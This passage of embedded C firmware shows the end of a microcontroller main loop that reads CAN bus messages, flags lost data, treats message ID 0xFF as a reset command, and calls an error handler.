            got_tx_message(0, count);
        }

        if (g_bRXFlag) {
            g_bRXFlag = false;
            uint32_t msg_id;

            // Read the message
            CANMessageGet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, 0);
            msg_id = g_sCAN0RxMessage.ui32MsgID;

            if(g_sCAN0RxMessage.ui32Flags & MSG_OBJ_DATA_LOST) {
#if defined(VERBOSE)
                //UARTprintf("%d\tCAN message loss detected\n", count);
#endif
            }

            if (msg_id == 0xFF) {
                // The ID 0xFF is used for RESET message.
                do_reset(count, count_2, g_ui8RXMsgData[0]);
                count = count_2 = 0;
                g_last_target_rcv = 0;
                continue;
            }

            count = got_rx_message(msg_id, count);

        } // g_bRXflag

        if (g_ui32ErrFlag) {
            CANErrorHandler();
        }
    } // while(1)
}
